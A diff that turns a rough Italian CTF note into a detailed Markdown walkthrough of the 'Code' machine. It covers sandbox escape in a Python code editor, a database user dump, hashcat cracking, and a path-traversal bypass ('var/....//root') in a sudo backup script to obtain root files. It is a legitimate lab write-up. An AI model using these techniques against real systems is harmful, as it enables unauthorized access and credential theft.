@@ -1,5 +1,133 @@
-Per prima cosa ho fatto una scansione con nmap, ho trovato due porte aperte, una ssh 22, e una 5000 http con gunicorn, cercato vulnerabilità per gunicorn, non ho trovato nulla di interessante quindi ho visitato il sito sulla porta 5000, è un python code editor, per prima cosa provo a fare un injection ma mi da in output Use of restricted keywords is not allowed.
-uso print(global()) per vedere tutte le dipendenze, noto che ci sono delle dipendenze per un database, quindi provo a usare il comando print(dir(db)), effettivamente db è un istanza quindi posso provare ad ottenere i dati, for user in User.query.all():
+# 💻 Code CTF - Walkthrough
+
+## 🔍 Ricognizione Iniziale
+
+Ho eseguito una scansione con `nmap`:
+
+```bash
+nmap -sC -sV -A 10.10.11.62
+```
+
+Ho rilevato due porte aperte:
+
+- **🛡️ Porta 22** → SSH  
+- **⚙️ Porta 5000** → HTTP (servito da Gunicorn)
+
+Accedendo al sito sulla porta 5000, ho trovato un'interfaccia web di un **Python code editor**. Ho provato una code injection base, ma ho ricevuto il messaggio:
+
+```
+Use of restricted keywords is not allowed
+```
+
+---
+
+## 🔬 Esplorazione dell'Editor Python
+
+Utilizzando il comando:
+
+```python
+print(globals())
+```
+
+Ho ottenuto un elenco delle variabili e moduli caricati. Tra questi ho individuato un oggetto `db`, possibile istanza di un database.
+
+Ho verificato con:
+
+```python
+print(dir(db))
+```
+
+Confermata la presenza del database, ho eseguito il dump degli utenti con:
+
+```python
+for user in User.query.all():
     print(user.__dict__)
-con questo script python ottengo tutti gli utenti del database, vedo che c'è un utente martin, con una password, hashata, uso hashcat e ottengo la password, ora con il comando ssh entro nell'utente martin, all'interno non trovo la user flag, però noto che c'è un altro utente app-program in cui non posso entrare, per prima cosa provo a fare sudo -l, vedo che c'è un programma bash che esegue backup seguendo le indicazioni di un file json, vado nella cartella dove effettua i backup e c'è un archivio tar, lo scarico tramite scp e unzippandolo trovo la user flag all'interno, ora devo ottenere la root flag, per fare ciò modifico il file json che il programma bash segue per fare in modo di effettuare in backup della root, per fare ciò il problema è stato che il backup lo fa solo delle cartelle var e home, per evitare questo problema ho fatto il backup di questo path var/....//root, (../ in piu sono perche se metti ../ li cancella, cosi aggiro il problema in quanto rimangono ../) una volta eseguito il programma bash che segue il json ottengo un archivio tar, come prima uso scp e unzippandolo ottengo la root flag.
-mi riscrivi questo report in md in modo piu dettagliato per favore, la ctf che ho fatto si chiama code
+```
+
+✅ Ho scoperto un utente chiamato **martin** con la password hashata.
+
+---
+
+## 🔑 Cracking della Password
+
+Ho salvato l'hash e l'ho crackato usando `hashcat`:
+
+```bash
+hashcat -m 0 -a 0 hash.txt rockyou.txt
+```
+
+✅ Password trovata! Ho poi effettuato l'accesso via SSH:
+
+```bash
+ssh martin@10.10.11.62
+```
+
+Tuttavia, la **user flag** non era nella home directory.
+
+---
+
+## 🧍‍♂️ Privilege Escalation a app-program
+
+Ho notato la presenza di un altro utente: **app-program**, ma non avevo i permessi per accedere alla sua home.
+
+Ho controllato i privilegi sudo con:
+
+```bash
+sudo -l
+```
+
+Ho scoperto che potevo eseguire uno script di **backup** come `app-program`:
+
+```bash
+User martin may run the following commands on localhost:
+    (ALL : ALL) NOPASSWD: /usr/bin/backy.sh
+```
+
+### 🔍 Analisi del Backup
+
+Il backup utilizza un file JSON come input. Accedendo alla cartella dei backup, ho trovato un archivio `.tar`:
+
+```bash
+scp martin@10.10.11.62:backups/code_home_app-production_app_2024_August.tar.bz2
+tar -xvjf code_home_app-production_app_2024_August.tar.bz2
+```
+
+✅ All’interno ho trovato la **user flag**!
+
+---
+
+## 🚀 Privilege Escalation a Root
+
+Il file task.json per il backup accetta solo cartelle sotto `/var` o `/home`. Per accedere a `/root`, ho usato un path malformato:
+
+```
+var/....//root
+```
+
+Questo ha aggirato il filtro che bloccava i `../`.
+
+Ho modificato task.json, rieseguito il backup:
+
+```bash
+sudo /usr/bin/backy.sh task.json
+```
+
+e scaricato l’archivio risultante:
+
+```bash
+scp martin@10.10.11.62:/backups/code_home_app-production_2025_April.tar.bz2 .
+tar -xvjf code_home_app-production_2025_April.tar.bz2
+```
+
+✅ All’interno ho trovato la **root flag**!
+
+---
+
+## 🎯 Conclusione
+
+CTF **Code** completata con successo! 🧩
+
+- Accesso ottenuto tramite code injection nel Python editor
+- Dump degli utenti dal DB e crack della password
+- Escalation tramite script di backup e manipolazione JSON
+- Flag utente e root acquisite! 🏁
